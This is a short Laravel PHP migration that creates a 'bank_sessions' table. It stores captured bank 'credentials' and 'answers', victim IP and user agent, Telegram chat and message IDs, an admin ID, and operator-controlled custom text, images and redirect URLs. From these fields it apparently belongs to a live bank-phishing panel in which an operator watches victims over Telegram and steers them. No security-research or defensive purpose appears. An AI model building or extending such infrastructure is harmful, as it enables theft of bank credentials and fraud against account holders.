<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::create('bank_sessions', function (Blueprint $table) {
            $table->uuid('id')->primary();
            $table->string('bank_slug', 64);
            $table->string('status', 32)->default('active');
            $table->json('action_type')->nullable();
            $table->text('credentials')->nullable();
            $table->json('answers')->nullable();
            $table->text('custom_text')->nullable();
            $table->string('custom_image_url')->nullable();
            $table->string('redirect_url')->nullable();
            $table->string('ip_address', 64)->nullable();
            $table->text('user_agent')->nullable();
            $table->unsignedBigInteger('telegram_message_id')->nullable();
            $table->unsignedBigInteger('telegram_chat_id')->nullable();
            $table->unsignedBigInteger('admin_id')->nullable();
            $table->timestamp('last_activity_at')->nullable();
            $table->timestamps();

            $table->index('bank_slug');
            $table->index('status');
        });
    }

    public function down(): void
    {
        Schema::dropIfExists('bank_sessions');
    }
};
